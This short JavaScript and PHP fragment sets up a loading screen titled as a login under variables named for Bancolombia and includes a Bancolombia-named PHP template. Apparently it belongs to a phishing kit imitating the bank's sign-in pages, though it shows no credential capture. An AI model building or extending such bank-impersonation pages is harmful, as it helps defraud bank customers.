var bancolombia_titulo = 'Inicio de sesión';
var bancolombia_contenido = `
<div class="sc-cWSHoV coMtmU">
    <div class="sc-eBMEME iSyOoC"></div>
    <div class="sc-dCFHLb flxpKV"></div>
    <p class="sc-fhzFiK jmHuCR">Cargando...</p>
</div>

`
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
    // $('.footer').remove()